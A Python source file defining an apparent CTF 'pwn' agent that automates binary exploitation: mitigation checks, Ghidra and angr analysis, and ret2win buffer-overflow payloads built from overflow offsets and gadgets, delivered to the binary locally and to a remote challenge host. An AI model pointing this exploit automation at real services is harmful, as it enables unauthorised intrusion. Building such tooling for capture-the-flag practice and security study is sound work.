"""PWN specialist agent.

Orchestration order for a binary challenge:
  1. checksec — identify mitigations
  2. Ghidra static analysis — functions, strings, imports (skipped if GHIDRA_HOME unset)
  3. angr symbolic execution — auto-find input for win/flag functions (skipped if angr missing)
     3b. Execute binary with payload locally; if no flag, send to remote (connection_info).
  4. ret2win — nm/objdump to find win function, cyclic to find offset, craft + deliver payload
     locally then remotely; tries common offsets when core dump unavailable.
  5. pwntools template — fallback exploitation scaffold + LLM strategy advice
"""
from __future__ import annotations

import logging
import os
import re
import struct
import subprocess
from typing import Any, Dict, List, Optional

from agents.base_agent import BaseAgent, AgentType
from core.decision_engine.llm_reasoner import LLMReasoner
from core.utils.flag_utils import find_first_flag
from core.utils.security import minimal_subprocess_env
from tools.common.elf_utils import is_elf_binary
from tools.pwn.pwntools_wrapper import PwntoolsWrapper

logger = logging.getLogger(__name__)

_PWN_KEYWORDS = frozenset([
    "overflow", "pwn", "exploit", "rop", "ret2libc", "shellcode",
    "buffer", "heap", "use-after-free", "uaf", "format string",
    "stack", "bypass", "binary", "reversing", "reverse",
])

_BINARY_EXTENSIONS = {".elf", ".bin", ".exe", ".out", ".o"}


def _is_binary(path: str) -> bool:
    return any(path.endswith(ext) for ext in _BINARY_EXTENSIONS) or is_elf_binary(path)


class PwnAgent(BaseAgent):
    """
    Specialist agent for advanced binary exploitation and symbolic reversing.

    Capabilities beyond BinaryExploitationAgent:
    - angr symbolic execution to auto-discover inputs for win conditions
    - Ghidra-assisted function discovery to feed angr targeting
    - Graceful degradation when optional tools (angr, Ghidra) are unavailable
    """

    def __init__(
        self,
        agent_id: str = "pwn_agent",
        reasoner: Optional[LLMReasoner] = None,
        pwn_tool: Optional[PwntoolsWrapper] = None,
    ) -> None:
        super().__init__(agent_id, AgentType.SPECIALIST)
        self.reasoner = reasoner or LLMReasoner()
        self.pwn_tool = pwn_tool or PwntoolsWrapper()
        self.capabilities = [
            "symbolic_execution",
            "win_function_discovery",
            "buffer_overflow",
            "rop_chain_generation",
            "shellcode_injection",
            "format_string_exploitation",
            "heap_exploitation",
            "binary_mitigation_analysis",
            "ghidra_static_analysis",
            "kernel_exploitation",
            "race_conditions",
        ]

        # Lazy-loaded optional tools — instantiated on first use so missing
        # deps don't prevent the agent from loading.
        self._angr: Any = None
        self._ghidra: Any = None

    # ------------------------------------------------------------------
    # BaseAgent interface
    # ------------------------------------------------------------------

    def analyze_challenge(self, challenge: Dict[str, Any]) -> Dict[str, Any]:
        description = challenge.get("description", "").lower()
        files = challenge.get("files", [])
        category = challenge.get("category", "").lower()

        has_binary = any(_is_binary(f) for f in files)
        has_keywords = any(kw in description for kw in _PWN_KEYWORDS)
        is_pwn_category = category in {"pwn", "binary", "reversing", "rev"}

        can_handle = has_binary or has_keywords or is_pwn_category
        confidence = 0.9 if can_handle else 0.1

        return {
            "agent_id": self.agent_id,
            "can_handle": can_handle,
            "confidence": confidence,
            "approach": (
                "Static analysis + symbolic execution + exploit generation"
                if can_handle else "None"
            ),
        }

    def solve_challenge(self, challenge: Dict[str, Any]) -> Dict[str, Any]:
        steps: List[str] = []
        files = challenge.get("files", [])
        binaries = [f for f in files if _is_binary(f)]

        if not binaries:
            conn_info = challenge.get("connection_info")
            if not conn_info:
                return self._result(challenge, "failed", steps,
                                    error="No binary files or connection info found")
            steps.append(f"Remote-only challenge: {conn_info}")
            return self._result(challenge, "attempted", steps)

        binary = binaries[0]
        steps.append(f"Primary binary: {binary}")

        # Phase 1 — mitigations
        steps.extend(self._phase_checksec(binary))

        # Phase 2 — Ghidra static analysis
        ghidra_steps, ghidra_functions = self._phase_ghidra(binary)
        steps.extend(ghidra_steps)

        # Phase 3 — angr symbolic execution → payload
        angr_steps, payload = self._phase_angr(binary, ghidra_functions, challenge)
        steps.extend(angr_steps)

        if payload is not None:
            # Phase 3b — run binary with payload locally
            run_steps, flag_str = self._phase_run_with_payload(binary, payload)
            steps.extend(run_steps)
            if flag_str:
                return self._result(challenge, "solved", steps, flag=flag_str)

            # Phase 3c — send angr payload to remote if available
            conn_info = challenge.get("connection_info")
            if conn_info:
                remote_steps, flag_str = self._send_payload_remote(conn_info, payload)
                steps.extend(remote_steps)
                if flag_str:
                    return self._result(challenge, "solved", steps, flag=flag_str)

            return self._result(
                challenge, "attempted", steps,
                artifacts={"angr_payload": payload.hex()},
            )

        # Phase 4 — ret2win: find win function + overflow offset, craft + deliver payload
        ret2win_steps, flag_str = self._phase_ret2win(binary, challenge)
        steps.extend(ret2win_steps)
        if flag_str:
            return self._result(challenge, "solved", steps, flag=flag_str)

        # Phase 5 — pwntools template + LLM fallback
        steps.extend(self._phase_pwntools_fallback(binary, challenge))

        return self._result(challenge, "attempted", steps)

    def get_capabilities(self) -> List[str]:
        return self.capabilities

    # ------------------------------------------------------------------
    # Phase helpers
    # ------------------------------------------------------------------

    def _phase_checksec(self, binary: str) -> List[str]:
        steps: List[str] = []
        steps.append("Running checksec...")
        mitigations = self.pwn_tool.run_checksec(binary)
        if "error" not in mitigations:
            steps.append(f"Mitigations: {mitigations}")
        else:
            steps.append(f"checksec unavailable: {mitigations['error']}")
        return steps

    def _phase_ghidra(self, binary: str) -> tuple[List[str], List[str]]:
        """Returns (steps, list_of_function_names)."""
        steps: List[str] = []
        function_names: List[str] = []

        ghidra = self._load_ghidra()
        if ghidra is None:
            steps.append("Ghidra skipped (GHIDRA_HOME not set or unavailable)")
            return steps, function_names

        steps.append("Running Ghidra headless analysis...")
        try:
            analysis = ghidra.analyze(binary, timeout_s=300)
            function_names = [f.name for f in analysis.functions]
            steps.append(
                f"Ghidra found {len(analysis.functions)} functions, "
                f"{len(analysis.strings)} strings, "
                f"{len(analysis.imports)} imports"
            )
            interesting = [
                n for n in function_names
                if any(kw in n.lower() for kw in ("win", "flag", "shell", "backdoor",
                                                   "success", "correct", "chall"))
            ]
            if interesting:
                steps.append(f"Interesting functions: {interesting}")
        except Exception as exc:
            steps.append(f"Ghidra analysis failed: {exc}")

        return steps, function_names

    def _phase_angr(
        self,
        binary: str,
        ghidra_functions: List[str],
        challenge: Dict[str, Any],
    ) -> tuple[List[str], Optional[bytes]]:
        """Returns (steps, stdin_payload_bytes_or_None)."""
        steps: List[str] = []

        angr_tool = self._load_angr()
        if angr_tool is None:
            steps.append("angr skipped (not installed — run: pip install angr)")
            return steps, None

        steps.append("Scanning binary for win/flag symbols via angr...")
        try:
            hits = angr_tool.find_win_symbols(binary)
        except Exception as exc:
            steps.append(f"Symbol scan failed: {exc}")
            return steps, None

        if not hits:
            # Supplement with any names Ghidra found
            for name in ghidra_functions:
                if any(kw in name.lower() for kw in ("win", "flag", "shell",
                                                      "backdoor", "success")):
                    from tools.pwn.angr_tool import SymbolHit
                    hits.append(SymbolHit(addr=0, name=name))

        if not hits:
            steps.append("No win/flag symbols found — skipping symbolic execution")
            return steps, None

        target = hits[0]
        steps.append(
            f"Targeting symbol '{target.name}' "
            f"(0x{target.addr:x} if resolved)"
        )

        result = (
            angr_tool.find_input(binary, find_addr=target.addr)
            if target.addr
            else angr_tool.find_input_by_symbol(binary, symbol_name=target.name)
        )

        steps.append(
            f"angr exploration completed in {result.duration_s:.1f}s — "
            f"{'found path' if result.found else 'no path found'}"
        )

        if result.found and result.stdin_input is not None:
            payload_preview = result.stdin_input[:80]
            try:
                readable = payload_preview.decode("utf-8", errors="replace")
            except Exception:
                readable = repr(payload_preview)
            steps.append(f"Payload (first 80 bytes): {readable!r}")
            return steps, result.stdin_input

        if result.error:
            steps.append(f"angr error: {result.error}")

        return steps, None

    def _phase_run_with_payload(
        self, binary: str, payload: bytes
    ) -> tuple[List[str], Optional[str]]:
        """
        Execute *binary* with *payload* piped to stdin, scan output for a flag.

        Returns (steps, flag_string_or_None).
        """
        steps: List[str] = []
        steps.append(f"Executing binary with angr payload ({len(payload)} bytes)...")
        try:
            if not os.access(binary, os.X_OK):
                current_mode = os.stat(binary).st_mode
                os.chmod(binary, current_mode | 0o700)
                steps.append("Binary was not executable; added user execute permission.")

            proc = subprocess.run(
                [binary],
                input=payload,
                capture_output=True,
                env=minimal_subprocess_env(),
                timeout=10,
            )
            output = (proc.stdout + proc.stderr).decode("utf-8", errors="replace")
            preview = output[:200].replace("\n", " ")
            steps.append(f"Binary output: {preview!r}")

            flag = find_first_flag(output)
            if flag:
                steps.append(f"Flag confirmed: {flag}")
                return steps, flag

            steps.append("No flag pattern found in binary output")

        except FileNotFoundError:
            steps.append(f"Binary not found or not executable: {binary}")
        except PermissionError:
            steps.append(f"Permission denied running binary: {binary}")
        except subprocess.TimeoutExpired:
            steps.append("Binary execution timed out (10s)")
        except Exception as exc:
            steps.append(f"Binary execution error: {exc}")

        return steps, None

    def _phase_pwntools_fallback(
        self, binary: str, challenge: Dict[str, Any]
    ) -> List[str]:
        steps: List[str] = []
        conn_info = challenge.get("connection_info")
        self.pwn_tool.generate_template(binary, conn_info)
        steps.append("Generated pwntools exploit template")

        if self.reasoner.is_available:
            steps.append("Requesting exploit strategy from LLM...")
            prompt = (
                f"Provide a brief exploit strategy for this binary challenge.\n"
                f"Binary: {binary}\n"
                f"Description: {challenge.get('description', 'N/A')}\n"
                f"Connection info: {conn_info or 'local only'}"
            )
            try:
                advice = self.reasoner._call_llm(prompt)
                steps.append(f"LLM strategy: {advice}")
            except Exception as exc:
                steps.append(f"LLM unavailable: {exc}")

        return steps

    # ------------------------------------------------------------------
    # ret2win helpers
    # ------------------------------------------------------------------

    def _phase_ret2win(
        self, binary: str, challenge: Dict[str, Any]
    ) -> tuple[List[str], Optional[str]]:
        steps: List[str] = []
        steps.append("Attempting ret2win exploitation...")

        if self._is_pie(binary):
            steps.append("ret2win: PIE enabled — static addresses unreliable; skipping")
            return steps, None

        win_addr = self._find_win_addr(binary, steps)
        if win_addr is None:
            steps.append("ret2win: no win-like function found")
            return steps, None

        conn_info = challenge.get("connection_info")
        offset = self._find_overflow_offset(binary, steps)

        if offset is not None:
            ret_steps, flag = self._try_ret2win_at_offset(binary, offset, win_addr, conn_info)
            steps.extend(ret_steps)
            return steps, flag

        steps.append("Core dump unavailable; trying common offsets")
        for candidate in [40, 56, 72, 88, 104, 120, 136, 152, 168, 200, 256]:
            ret_steps, flag = self._try_ret2win_at_offset(binary, candidate, win_addr, conn_info)
            steps.extend(ret_steps)
            if flag:
                return steps, flag

        return steps, None

    def _try_ret2win_at_offset(
        self,
        binary: str,
        offset: int,
        win_addr: int,
        conn_info: Optional[str],
    ) -> tuple[List[str], Optional[str]]:
        steps: List[str] = []
        ret_gadget = self._find_ret_gadget(binary)

        # On x86-64 some functions need 16-byte stack alignment; try both orderings.
        base = b"A" * offset
        payloads: List[tuple[str, bytes]] = []
        if ret_gadget:
            payloads.append((
                f"offset={offset} + ret(0x{ret_gadget:x}) + win",
                base + struct.pack("<Q", ret_gadget) + struct.pack("<Q", win_addr),
            ))
        payloads.append((
            f"offset={offset} + win",
            base + struct.pack("<Q", win_addr),
        ))

        for desc, payload in payloads:
            steps.append(f"Trying ret2win: {desc}")
            run_steps, flag = self._phase_run_with_payload(binary, payload)
            steps.extend(run_steps)
            if flag:
                return steps, flag

            if conn_info:
                remote_steps, flag = self._send_payload_remote(conn_info, payload)
                steps.extend(remote_steps)
                if flag:
                    return steps, flag

        return steps, None

    def _find_win_addr(self, binary: str, steps: List[str]) -> Optional[int]:
        WIN_KEYWORDS = ("win", "flag", "shell", "backdoor", "success", "correct")
        for cmd in (
            ["nm", "-n", "--defined-only", binary],
            ["objdump", "-t", binary],
        ):
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if r.returncode != 0:
                    continue
                for line in r.stdout.splitlines():
                    parts = line.split()
                    if len(parts) < 2:
                        continue
                    name = parts[-1]
                    addr_str = parts[0]
                    if any(kw in name.lower() for kw in WIN_KEYWORDS):
                        try:
                            addr = int(addr_str, 16)
                            if addr > 0:
                                steps.append(f"ret2win: found '{name}' @ 0x{addr:x}")
                                return addr
                        except ValueError:
                            continue
            except Exception as exc:
                logger.debug("Symbol lookup (%s) failed: %s", cmd[0], exc)
        return None

    def _find_overflow_offset(self, binary: str, steps: List[str]) -> Optional[int]:
        try:
            import pwn  # type: ignore
            pwn.context.log_level = "error"
        except ImportError:
            steps.append("pwntools not installed; falling back to common offsets")
            return None

        try:
            r = subprocess.run(["file", binary], capture_output=True, text=True)
            pwn.context.arch = "i386" if "32-bit" in r.stdout else "amd64"
        except Exception:
            pwn.context.arch = "amd64"

        try:
            import resource
            resource.setrlimit(resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
        except Exception:
            pass

        try:
            p = pwn.process(binary, env=minimal_subprocess_env())
            p.sendline(pwn.cyclic(300))
            p.wait()
            try:
                core = p.corefile
                if core is None:
                    raise ValueError("no core dump")
                fault = core.fault_addr
                offset = pwn.cyclic_find(fault)
                if offset >= 0:
                    steps.append(f"Overflow offset = {offset} (core dump, fault @ 0x{fault:x})")
                    return offset
            except Exception as core_exc:
                logger.debug("Core dump analysis: %s", core_exc)
        except Exception as exc:
            logger.debug("Overflow offset detection: %s", exc)

        return None

    def _find_ret_gadget(self, binary: str) -> Optional[int]:
        """Return the address of a bare 'ret' gadget for x86-64 stack alignment."""
        try:
            r = subprocess.run(
                ["ROPgadget", "--binary", binary, "--only", "ret"],
                capture_output=True, text=True, timeout=15,
            )
            for line in r.stdout.splitlines():
                if " : ret" == line[line.find(" : "):].rstrip():
                    addr_str = line.split(" : ")[0].strip()
                    try:
                        return int(addr_str, 16)
                    except ValueError:
                        continue
        except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
            pass

        try:
            r = subprocess.run(
                ["objdump", "-d", binary], capture_output=True, text=True, timeout=15
            )
            for line in r.stdout.splitlines():
                m = re.match(r"\s+([0-9a-f]+):\s+c3\s+ret\b", line)
                if m:
                    return int(m.group(1), 16)
        except Exception:
            pass

        return None

    def _is_pie(self, binary: str) -> bool:
        try:
            r = subprocess.run(
                ["readelf", "-h", binary], capture_output=True, text=True, timeout=5
            )
            for line in r.stdout.splitlines():
                if "Type:" in line:
                    return "DYN" in line
        except Exception:
            pass
        return False

    def _send_payload_remote(
        self, conn_info: str, payload: bytes
    ) -> tuple[List[str], Optional[str]]:
        steps: List[str] = []
        try:
            host, port_str = conn_info.rsplit(":", 1)
            port = int(port_str)
        except (ValueError, AttributeError):
            steps.append(f"Could not parse connection_info: {conn_info!r}")
            return steps, None

        steps.append(f"Sending payload to remote {host}:{port}...")

        try:
            import pwn  # type: ignore
            pwn.context.log_level = "error"
            io = pwn.remote(host, port, timeout=10)

            try:
                banner = io.recvrepeat(timeout=2).decode("utf-8", errors="replace")
                if banner.strip():
                    steps.append(f"Remote banner: {banner[:200]!r}")
            except Exception:
                pass

            io.sendline(payload)

            try:
                output = io.recvall(timeout=5).decode("utf-8", errors="replace")
            except Exception:
                output = ""
            io.close()

            preview = output[:300].replace("\n", " ")
            steps.append(f"Remote output: {preview!r}")

            flag = find_first_flag(output)
            if flag:
                steps.append(f"Flag found via remote: {flag}")
            return steps, flag

        except ImportError:
            steps.append("pwntools not installed; cannot send to remote")
        except Exception as exc:
            steps.append(f"Remote delivery failed: {exc}")

        return steps, None

    # ------------------------------------------------------------------
    # Lazy loaders
    # ------------------------------------------------------------------

    def _load_angr(self) -> Any:
        if self._angr is not None:
            return self._angr
        try:
            from tools.pwn.angr_tool import AngrTool
            self._angr = AngrTool()
        except ImportError:
            self._angr = None
        return self._angr

    def _load_ghidra(self) -> Any:
        if self._ghidra is not None:
            return self._ghidra
        import os
        if not os.environ.get("GHIDRA_HOME"):
            return None
        try:
            from tools.pwn.headless_ghidra_tool import HeadlessGhidraTool
            self._ghidra = HeadlessGhidraTool()
        except Exception:
            self._ghidra = None
        return self._ghidra

    # ------------------------------------------------------------------
    # Result builder
    # ------------------------------------------------------------------

    @staticmethod
    def _result(
        challenge: Dict[str, Any],
        status: str,
        steps: List[str],
        flag: Optional[str] = None,
        artifacts: Optional[Dict[str, Any]] = None,
        error: Optional[str] = None,
    ) -> Dict[str, Any]:
        out: Dict[str, Any] = {
            "challenge_id": challenge.get("id"),
            "agent_id": "pwn_agent",
            "status": status,
            "steps": steps,
        }
        if flag is not None:
            out["flag"] = flag
        if artifacts:
            out["artifacts"] = artifacts
        if error:
            out["error"] = error
        return out
